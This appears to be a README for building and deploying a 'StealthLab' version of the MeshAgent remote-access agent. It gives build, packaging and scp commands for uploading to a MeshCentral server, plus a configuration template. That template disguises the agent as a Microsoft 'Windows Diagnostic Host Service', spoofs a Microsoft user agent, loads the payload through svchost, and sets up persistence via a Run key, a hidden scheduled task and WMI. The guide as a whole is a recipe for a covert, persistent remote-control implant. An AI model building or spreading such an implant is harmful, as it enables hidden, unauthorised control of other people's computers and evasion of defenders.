# MeshAgent Custom Build & Deployment Guide

This guide describes the current, fully automated workflow for producing StealthLab-ready binaries and deploying them to your MeshCentral instance.

> **Use hostnames, not bare IPs.** Keep the MeshCentral URLs (`agents.high.support`, `relay.high.support`, etc.) in both `branding_config.json` and the MeshCentral portal so the TLS pins remain valid.

---

## Overview

The local build pipeline now handles every step end-to-end:

- `build.ps1` (StealthLab profile enabled by default) generates branding headers, builds the StealthLab DLL, and *automatically stages* `meshservice\embedded\svchost_payload.dll` with the latest payload.
- The same invocation emits StealthLab binaries to:
  - `meshservice\x64\StealthLab\MeshService-2022.exe`
  - `meshservice\StealthLab\MeshService-2022.exe`
- StealthLab defaults are enforced; when you must exercise a non-StealthLab build (for example, a legacy Release regression), invoke MSBuild directly using the commands in *Manual Release Regression* below.
- Packaging scripts (`build_complete.ps1`, `build_all.ps1`) rename artifacts to the production-friendly `diagsvc.dll` and create a ready-to-ship drop folder.
- `tools\prepare_meshcentral_agent.ps1` runs the StealthLab build, verifies the embedded svchost payload, and stages `MeshService64.exe`, `diagsvc.dll`, provisioning files, and hashes under `dist\meshcentral`.

GitHub Actions remains available for automation, but the on-device workflow is the source of truth and is what the documentation below covers.

---

## Prerequisites

- Windows 10/11 build workstation.
- Visual Studio 2022 with the following workloads:
  - Desktop development with C++
  - MSVC v143 toolset
  - Windows 10/11 SDK
- PowerShell 7+ (pwsh) recommended; Windows PowerShell 5.1 supported.
- Python 3.10+ on the PATH (used by helper scripts).
- Git submodules initialised:  `git submodule update --init --recursive`
- `branding_config.json` populated with your production values (see the updated template later in this document).
- Validate branding before building:
  ```powershell
  pwsh ./tools/validate_branding_config.ps1
  ```
  The build scripts call this automatically, but running it up front catches schema and hex-length mistakes early.

---

## Build Workflow (Recommended)

1. Open *Developer PowerShell for VS 2022* (or any PowerShell session with VS build tools available) and change to the repository root:
   ```powershell
   cd C:\Users\Maincon\OneDrive\Documents\GitHub\MeshAgent
   ```
2. (Optional) Pull the latest changes:
   ```powershell
   git pull
   ```
3. Launch the StealthLab build (StealthLab profile and svchost payload restaging are enabled by default):
   ```powershell
   .\build.ps1
   ```
   The script will:
   - Revalidate `branding_config.json` and regenerate `meshagent_branding.h`/`WinDiagnosticHost.msh`.
   - Rebuild `MeshService-2022.dll` under `meshservice\x64\StealthLab_DLL`.
   - Copy that DLL into `meshservice\embedded\svchost_payload.dll` (no manual staging required).
   - Emit StealthLab executables for x64 and Win32 and print their sizes plus MD5 hashes.
4. Run the fast regression harness to confirm branding, payload, and resource checks:
   ```powershell
   pwsh .\test.ps1 -ReportPath .\dist\verify-report.json
   ```
   Expect warnings for unsigned binaries until you apply Authenticode signatures. Any failures must be resolved before packaging.
5. (Optional) Build additional StealthLab variants by passing `-Configuration <Name>` (e.g. `StealthLab_DLL`, `Debug`). StealthLab enforcement remains in place regardless of switches; to exercise plain Release binaries, follow the *Manual Release Regression* workflow.

Verify the payload was staged correctly:
```powershell
Get-FileHash meshservice\x64\StealthLab_DLL\MeshService-2022.dll
Get-FileHash meshservice\embedded\svchost_payload.dll
# Hashes should match
```

---

## Packaging Options

### 1. Generate a Drop-In Package (Recommended)

```powershell
.\build_complete.ps1 [-RunHealthCheck] [-SkipArchive]
```

`build_complete.ps1` orchestrates a StealthLab build, runs `test.ps1`, produces a timestamped bundle under `dist\\MeshAgent_Stealth_<stamp>\\`, and (optionally) executes the health probe.

Each bundle contains:

- `diagsvc.dll` – svchost payload ready for deployment.
- `MeshService64.exe` / `MeshService.exe` – binaries for direct service overrides.
- `verification\\` – regression output (`verify-log.txt`, `verify-report.json`) plus `health_report.json` when `-RunHealthCheck` is supplied.
- `MeshAgent_Stealth_*\\.sha256` and `*-manifest.json` – digests and signer metadata (also copied to `dist\\`).
- `checksums.txt`, `install.ps1`, and `README.txt` – operator hand-off material.

> **Health check tip:** the probe can only verify the installed service when it knows the install path. Provide it via `-HealthCheckArgs @{ InstallPath = 'C:\\ProgramData\\DiagnosticHost' }` if you need a fully green report; otherwise it will finish with one warning and one failure indicating the binary was not located.

### Package Verification

After packaging, review the generated `verification\\` folder or rerun the suites manually:

```powershell
pwsh .\test.ps1 -BinaryPath .\dist\MeshAgent_Stealth_YYYYMMDD_HHMMSS
# Optional release regression (targets meshservice\Release\*.exe)
pwsh .\test_comprehensive.ps1
```

`test.ps1` checks branding JSON/schema compliance, embedded service/display names, Mesh/Server IDs, metadata versioning, and optional signer allow-list entries. Warnings about missing Authenticode signatures are expected until you sign the binaries. Failures indicate a mismatch between `branding_config.json` and the compiled artefacts.

### 2. Manual Artifact Pickup

If you need individual files:

| Artifact | Location |
|----------|----------|
| StealthLab DLL payload | `meshservice\x64\StealthLab_DLL\MeshService-2022.dll` |
| Bundled resource copy  | `meshservice\embedded\svchost_payload.dll` |
| StealthLab x64 EXE     | `meshservice\x64\StealthLab\MeshService-2022.exe` |
| StealthLab Win32 EXE   | `meshservice\StealthLab\MeshService-2022.exe` |

To create a `diagsvc.dll` manually:
```powershell
Copy-Item meshservice\x64\StealthLab_DLL\MeshService-2022.dll diagsvc.dll
```

### 3. Manual Release Regression
When you need clean `meshservice\Release` outputs (for example to run `test_comprehensive.ps1` or attach legacy artefacts to a GitHub release), build directly with MSBuild:

```powershell
$msbuild = "${env:ProgramFiles}\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe"
& $msbuild MeshAgent-2022.sln /p:Configuration=Release /p:Platform=x64 /m /nologo
& $msbuild meshservice\MeshService-2022.vcxproj /p:Configuration=Release /p:Platform=Win32 /m /nologo
pwsh .\test_comprehensive.ps1
```

This produces `Release\MeshService64.exe` plus `meshservice\Release\MeshService.exe`. Use `out\deliverables\MeshAgent-<yyyy-mm-dd>\` to stage hashes, metadata, and ZIP archives (see *Transfer Package Generation* below).

### 4. MeshCentral override bundle

To stage files exactly as MeshCentral expects (including the executable override), run:

```powershell
.\tools\prepare_meshcentral_agent.ps1
```

This produces `dist\meshcentral\` with:

- `MeshService64.exe` (and optionally `MeshService.exe`) – svchost-enabled executables ready to copy into `meshcentral-data\agents\`.
- `diagsvc.dll`, provisioning `.msh`, branding JSON, and `checksums.txt` for integrity validation.
- A README summarising deployment steps and hashes.

### 5. Transfer Package Generation
Run the helper snippet below whenever you need to hand off a ZIP with metadata and hashes (for GitHub releases or offline transfer):
Equivalent helper script: `pwsh .\tools\create_release_package.ps1`

```powershell
$date = Get-Date -Format 'yyyy-MM-dd'
$root = Join-Path $PSScriptRoot "out\deliverables\MeshAgent-$date"
New-Item -ItemType Directory -Path (Join-Path $root 'bin'), (Join-Path $root 'pdb') -Force | Out-Null
Copy-Item -Path '.\Release\MeshService64.exe','.\meshservice\Release\MeshService.exe' -Destination (Join-Path $root 'bin') -Force
Copy-Item -Path '.\Release\MeshService64.pdb','.\meshservice\Release\MeshService.pdb' -Destination (Join-Path $root 'pdb') -Force
Get-ChildItem (Join-Path $root 'bin') | ForEach-Object {
    $hash = Get-FileHash $_ -Algorithm SHA256
    '{0}  SHA256  {1}' -f $_.Name, $hash.Hash.ToLower()
} | Set-Content -Path (Join-Path $root 'hashes.txt') -Encoding ASCII
$commit = (git rev-parse HEAD).Trim()
$branch = (git rev-parse --abbrev-ref HEAD).Trim()
$vswhere = 'C:\Program Files (x86)\Microsoft Visual Studio\Installer\vswhere.exe'
$vs = if (Test-Path $vswhere) { (& $vswhere -latest -requires Microsoft.Component.MSBuild -property catalog_productDisplayVersion).Trim() } else { 'unknown' }
$sdkLib = 'C:\Program Files (x86)\Windows Kits\10\Lib'
$sdk = if (Test-Path $sdkLib) { (Get-ChildItem $sdkLib | Where-Object PSIsContainer | Sort-Object Name -Descending | Select-Object -First 1 -ExpandProperty Name) } else { 'unknown' }
@(
    "Commit: $commit"
    "Branch: $branch"
    "Build date: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss K')"
    "Visual Studio: $vs"
    "Windows SDK: $sdk"
    "Build matrix:"
    "  - MeshAgent-2022.sln / Release|x64"
    "  - meshservice\MeshService-2022.vcxproj / Release|Win32"
    "Warnings: C4996 (sprintf/sscanf), C4013 (Stealth_DebugPrintfW); no errors."
) | Set-Content -Path (Join-Path $root 'metadata.txt') -Encoding UTF8
$zip = Join-Path 'out\deliverables' ("MeshAgent-$date-win.zip")
if (Test-Path $zip) { Remove-Item $zip -Force }
Compress-Archive -Path (Join-Path $root '*') -DestinationPath $zip -Force
```

Deliverable contents:

- `bin\MeshService64.exe`, `bin\MeshService.exe`
- `pdb\MeshService64.pdb`, `pdb\MeshService.pdb` (optional for archival)
- `hashes.txt` (SHA256 list)
- `metadata.txt` (commit/branch, toolchain versions, build matrix, warnings)
- `MeshAgent-YYYY-MM-DD-win.zip` ready to upload to GitHub Releases or share securely.
- Upload  `MeshAgent-YYYY-MM-DD-win.zip` (plus `hashes.txt` / `metadata.txt` if desired) to GitHub Releases or attach it to the secure transfer channel used for deployment approvals. 

---

## Deploy to MeshCentral

1. Copy the freshly built `diagsvc.dll` to the MeshCentral server. Adjust the destination to match your installation (default shown below):
   ```powershell
   scp dist\package_*\diagsvc.dll root@72.60.233.29:/opt/meshcentral/meshcentral-data/agents-custom/meshagent_win32_x64.exe
   ```
   *If you maintain separate x86/x64 payloads, upload each with the name MeshCentral expects.*
2. (Optional but recommended) Replace the download executable with `dist\meshcentral\MeshService64.exe` copied to `/opt/meshcentral/meshcentral-data/agents/MeshService64.exe` (and `MeshService.exe` for Win32). This keeps the portal download in sync with the svchost payload.
3. Back up the existing agent binaries before overwriting.
4. Restart MeshCentral to make the new agent downloadable:
   ```bash
   sudo systemctl restart meshcentral
   ```
5. From the MeshCentral portal, download the Windows x64 agent and confirm the timestamp/hash matches the build. Verify the embedded `SVCHOSTDLL` resource with `Test-SvchostPayload`.

---

## Post-Deployment Checks

- Confirm the staged payload on disk matches the StealthLab DLL:
  ```powershell
  Get-FileHash "C:\\ProgramData\\DiagnosticHost\diagsvc.dll"
  ```
- Run the included verifier to ensure branding, TLS profile, and provisioning data match expectations:
  ```powershell
  .\tools\verify_deployment.ps1 -Server agents.high.support
  ```
- Capture a post-install snapshot:
  ```powershell
  .\tools\health_check.ps1 -ServiceName WinDiagnosticHost -ReportPath .\dist\post-deploy-health.json
  ```
- Use `tools\uninstall.ps1` and `tools\rollback_update.ps1` when you need reversible rollouts (see quick checklist under `docs/files/meshagent_release_checklist.md`).
- Enrol a test endpoint with the newly published agent and inspect the MeshCentral console for a successful check-in.

---

## Optional: GitHub Actions Automation

The workflow in `.github/workflows/build-release.yml` still functions, but it now relies on the same PowerShell build scripts documented above. When enabling the workflow:

- Provide `SSH_PRIVATE_KEY` if you want the pipeline to deploy automatically (same key used for manual `scp`).
- Update `BRANDING_CONFIG_JSON` to match the refreshed schema (see next section).
- Expect the artifacts to be named `MeshService-2022.exe` instead of the legacy `MeshService64.exe`.

Manual approvals are no longer needed to stage the DLL—the workflow inherits the `Stage-SvchostPayload` helper, so GitHub builds and local builds stay in sync.

### MinGW Build Notes
For cross-compiling with MinGW-w64 (e.g., on MSYS2):

- Install toolchains: `pacman -S mingw-w64-x86_64-gcc mingw-w64-i686-gcc mingw-w64-x86_64-osslsigncode`. `strings` ships via `binutils` (`pacman -S binutils`).
- Run the helper:
  ```bash
  ./build-windows-mingw.sh
  ```
  The script now logs validation output to `build/mingw/build-mingw.log` (service/display names, Mesh ID, Server ID). Review the log for any `[WARN]` entries.
- Signed builds: if the binaries are unsigned, `osslsigncode verify` will emit warnings—this is expected for local test builds.
- Troubleshooting tips:
  | Warning | Action |
  |---------|--------|
  | `strings` not available | Install GNU binutils within MSYS2 (`pacman -S binutils`). |
  | Mesh/Server ID missing in log | Re-run `pwsh ./tools/embed_provisioning_simple.ps1` before building; confirm `branding_config.json` values. |
  | `osslsigncode verify` failure | Sign the binaries (or disable the check) prior to distribution; local unsigned builds may skip this step. |

---

## Troubleshooting Quick Reference

| Symptom | Checks |
|---------|--------|
| `svchost_payload.dll` not updated | Re-run `.\\build.ps1`; verify hashes between `meshservice\x64\StealthLab_DLL\MeshService-2022.dll` and `meshservice\embedded\svchost_payload.dll`. |
| MeshCentral still serving old agent | Confirm upload path, restart MeshCentral, and clear CDN/cache if fronted by a proxy. |
| Agent fails to enrol | Ensure `branding_config.json` `provisioning.serverUrl` matches the domain you uploaded to, and that the server certificate hash is current. |
| Build script exits early | Check that Visual Studio 2022 MSBuild is installed and available at `C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe`. |
| Health check reports missing binaries | Re-run `build_complete.ps1 -RunHealthCheck` with `-HealthCheckArgs @{ InstallPath = ''C:\\ProgramData\\DiagnosticHost'' }` (or your deployment path). |

---

## Updated Configuration Template

The companion `branding_config.template.json` now mirrors every field consumed by the build scripts. Duplicate it to `branding_config.json` and replace the placeholder values:

```jsonc
{
  "$schema": "./schema/meshagent.schema.json",
  "branding": {
    "companyName": "Microsoft Corporation",
    "serviceName": "WinDiagnosticHost",
    "displayName": "Windows Diagnostic Host Service",
    "binaryName": "diaghost.exe",
    "productName": "Windows Diagnostic Host",
    "description": "system health monitoring",
    "installRoot": "C:/ProgramData/DiagnosticHost",
    "logPath": "C:/ProgramData/DiagnosticHost/logs"
  },
  "network": {
    "primaryEndpoint": "wss://agents.high.support:4445/agent.ashx",
    "userAgent": "Microsoft-CryptoAPI/10.0",
    "alpn": ["http/1.1"],
    "retryAttempts": 5,
    "retryDelay": 10
  },
  "stealth": {
    "enabled": true,
    "svchostMode": true,
    "bundleExtract": true
  },
  "persistence": {
    "runKey": true,
    "scheduledTask": { "enabled": true, "hidden": true },
    "wmi": { "enabled": true }
  },
  "provisioning": {
    "meshName": "Windows Diagnostics",
    "meshType": "2",
    "serverUrl": "wss://agents.high.support:4445/agent.ashx",
    "serverId": "YOUR_SERVER_CERT_HASH",
    "meshId": "YOUR_MESH_ID"
  }
}

> When `stealth.svchostMode` is enabled the build pipeline now forces `stealth.bundleExtract` on so the svchost DLL payload is dropped and registered automatically during installation.
```

Keep the JSON committed without secrets; override sensitive values via environment variables or CI secrets when needed.

---

Need more depth? Refer to `STEALTHLAB_CONFIG_GUIDE.md` for registry/service layout and `OPSEC.md` for operational security practices. For assistance or questions, open an issue or contact the maintainer directly.







